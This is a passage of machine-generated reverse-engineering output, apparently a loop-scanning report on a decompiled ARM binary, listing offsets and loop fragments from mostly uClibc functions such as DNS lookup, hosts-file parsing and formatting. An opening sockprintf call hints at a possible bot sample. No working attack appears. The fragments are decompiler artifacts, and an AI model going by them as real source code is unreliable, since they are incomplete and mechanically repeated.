		sockprintf(v162, (int32_t)"%s");
=============================WHILE LOOPS ID : 110 @ __udivsi3 ====================================
++++++++ WHILE START : 19996 
++++++++ WHILE FUNCTION : __udivsi3 
++++++++ WHILE END : 20208 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 111 @ __umodsi3 ====================================
++++++++ WHILE START : 20581 
++++++++ WHILE FUNCTION : __umodsi3 
++++++++ WHILE END : 20935 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 112 @ __modsi3 ====================================
++++++++ WHILE START : 21180 
++++++++ WHILE FUNCTION : __modsi3 
++++++++ WHILE END : 21560 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 115 @ _vfprintf_internal ====================================
++++++++ WHILE START : 30839 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 31569 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 117 @ _ppfs_setargs ====================================
++++++++ WHILE START : 32172 
++++++++ WHILE FUNCTION : _ppfs_setargs 
++++++++ WHILE END : 32288 
++++++++ INTRESTING INSTRUCTIONS :  
		case 256: {
		case 512: {
=============================WHILE LOOPS ID : 119 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 32700 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 33478 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 124 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 34779 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 34853 
++++++++ INTRESTING INSTRUCTIONS :  
		if ((char)getc_unlocked((char *)a3) == -1) {
=============================WHILE LOOPS ID : 128 @ __GI_strchr ====================================
++++++++ WHILE START : 36503 
++++++++ WHILE FUNCTION : __GI_strchr 
++++++++ WHILE END : 36591 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 136 @ strstr ====================================
++++++++ WHILE START : 37613 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 37729 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 137 @ __xpg_strerror_r ====================================
++++++++ WHILE START : 38084 
++++++++ WHILE FUNCTION : __xpg_strerror_r 
++++++++ WHILE END : 38154 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 139 @ strcasestr ====================================
++++++++ WHILE START : 38589 
++++++++ WHILE FUNCTION : strcasestr 
++++++++ WHILE END : 38639 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 143 @ __heap_free ====================================
++++++++ WHILE START : 45478 
++++++++ WHILE FUNCTION : __heap_free 
++++++++ WHILE END : 45546 
++++++++ INTRESTING INSTRUCTIONS :  
		__heap_link_free_area_after();
		__heap_link_free_area_after();
		__heap_link_free_area();
		__heap_link_free_area();
=============================WHILE LOOPS ID : 145 @ srandom_r ====================================
++++++++ WHILE START : 47252 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 47262 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_random_r((int32_t *)(int32_t)a1, (int32_t)&v173);
=============================WHILE LOOPS ID : 154 @ __stdio_WRITE ====================================
++++++++ WHILE START : 54487 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 54564 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 157 @ _fpmaxtostr ====================================
++++++++ WHILE START : 56095 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 59397 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 169 @ _memcpy ====================================
++++++++ WHILE START : 61574 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 61706 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 172 @ _memcpy ====================================
++++++++ WHILE START : 61824 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 61887 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 175 @ _memcpy ====================================
++++++++ WHILE START : 61932 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 61995 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 176 @ _memcpy ====================================
++++++++ WHILE START : 62004 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 62067 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 180 @ _memcpy ====================================
++++++++ WHILE START : 62246 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 62281 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 183 @ _memcpy ====================================
++++++++ WHILE START : 62353 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 62388 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 184 @ _memcpy ====================================
++++++++ WHILE START : 62423 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 62486 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 185 @ __GI_memchr ====================================
++++++++ WHILE START : 63047 
++++++++ WHILE FUNCTION : __GI_memchr 
++++++++ WHILE END : 63162 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 188 @ memrchr ====================================
++++++++ WHILE START : 63547 
++++++++ WHILE FUNCTION : memrchr 
++++++++ WHILE END : 63653 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 191 @ __GI_strpbrk ====================================
++++++++ WHILE START : 64052 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 64085 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 192 @ inet_aton ====================================
++++++++ WHILE START : 64263 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 64350 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 193 @ __dns_lookup ====================================
++++++++ WHILE START : 64552 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 65365 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		int32_t v192 = inet_pton(10, (char *)v173, (int32_t)&v191); // 0x18fbc
		inet_addr(v173);
		int32_t v195 = socket(); // 0x1901c
		if (__libc_connect(v195, (struct sockaddr *)&v171, 28) < 0) {
		__libc_send(v195, (int32_t *)v157, result2 + v185, 0);
		int32_t v205 = __libc_recv(v195, (int32_t *)v157, 512, v203, (int32_t)&v204); // 0x190c0
		free();
		free();
		while (true) {
		while (true) {
		__libc_close(v195);
		free();
		free();
		__libc_close(v195);
		free();
		free();
		free();
		__libc_close(v195);
		free();
		free();
		__libc_close(v195);
		free();
		free();
		free();
		free();
		__libc_close(v195);
		free();
		free();
		__libc_close(v195);
		free();
		free();
		free();
		free();
		free();
		free();
		free();
		free();
		free();
		free();
=============================WHILE LOOPS ID : 194 @ __open_nameservers ====================================
++++++++ WHILE START : 65846 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 66072 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (fgets(v163, 128, v167) == 0) {
		free();
		free();
		while (true) {
		if (fgets(v163, 128, v167) == 0) {
		if (fgets(v163, 128, v167) == 0) {
=============================WHILE LOOPS ID : 197 @ __GI_strspn ====================================
++++++++ WHILE START : 69200 
++++++++ WHILE FUNCTION : __GI_strspn 
++++++++ WHILE END : 69235 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 200 @ inet_pton ====================================
++++++++ WHILE START : 69910 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 70029 
++++++++ INTRESTING INSTRUCTIONS :  
		if (inet_pton4((char *)v171, v169) >= 1) {
		while (true) {
=============================WHILE LOOPS ID : 202 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 70448 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 70761 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		if (inet_ntop4(a2 + 12, v193, v166 - v193 - 32) == 0) {
		v199 = sprintf(v193, (int32_t)"%x", v197, v198, (int32_t)&v200, (int32_t)&v200);
		if (inet_ntop4(a2 + 12, v193, v166 - v193 - 32) == 0) {
		v199 = sprintf(v193, (int32_t)"%x", v197, v198, (int32_t)&v200, (int32_t)&v200);
		while (true) {
=============================WHILE LOOPS ID : 203 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 72077 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 72090 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v170, v174, v175) != 0) {
		__GI_fclose((char *)v175);
=============================WHILE LOOPS ID : 204 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 72141 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 72154 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v170, v174, v175) != 0) {
		__GI_fclose((char *)v175);
=============================WHILE LOOPS ID : 205 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 72230 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 72243 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v170, v174, v175) != 0) {
		__GI_fclose((char *)v175);
=============================WHILE LOOPS ID : 206 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 72268 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 72499 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v170, v174, v175) == 0) {
		__GI_fclose((char *)v175);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (__GI_strcasecmp(v189, v214) == 0) {
		if (inet_pton(2, (char *)v216, v173) > 0) {
		__GI_fclose((char *)v175);
		if (inet_pton(10, (char *)v217, v183) > 0) {
		__GI_fclose((char *)v175);
		while (true) {
		if (fgets(v218, v219, v175) != 0) {
		int32_t v221 = __GI_fclose((char *)v175); // 0x1ab84
=============================WHILE LOOPS ID : 208 @ __decode_dotted ====================================
++++++++ WHILE START : 73323 
++++++++ WHILE FUNCTION : __decode_dotted 
++++++++ WHILE END : 73406 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 210 @ __aeabi_idiv ====================================
++++++++ WHILE START : 73961 
++++++++ WHILE FUNCTION : __aeabi_idiv 
++++++++ WHILE END : 74189 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 211 @ __aeabi_ddiv ====================================
++++++++ WHILE START : 78942 
++++++++ WHILE FUNCTION : __aeabi_ddiv 
++++++++ WHILE END : 79143 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
